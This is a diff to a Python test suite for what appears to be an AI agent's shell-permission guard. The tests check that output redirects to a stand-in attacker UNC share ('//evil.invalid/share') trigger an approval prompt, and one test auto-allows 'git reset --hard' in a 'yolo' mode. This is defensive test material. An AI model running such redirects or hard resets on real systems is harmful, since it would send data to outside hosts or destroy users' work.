@@ -1176,7 +1176,8 @@ def test_relative_redirects_in_a_mapped_or_unc_working_folder(
     assert run("git log > ../../other/log.txt") == "ask"  # climbs out
     assert run("git log > //evil.invalid/share/log.txt") == "ask"
     assert run("git log > log.txt", cwd="//evil.invalid/share") == "ask"
-    assert not any("evil" in c for c in fake_share)  # a model-chosen host: never resolved
+    if os.name == "nt":  # on POSIX a // path is a local one, and resolving it opens nothing
+        assert not any("evil" in c for c in fake_share)  # a model-chosen host: never resolved
     if not network_folder:  # headless: the rule clears the guard's prompt
         a = _agent(AutoSettings(mode="yolo", rules=["allow run_command git reset*"]), cwd=proj)
         assert a._permission_decision(RUN, _cmd("git reset --hard HEAD > r.log")) == "allow"
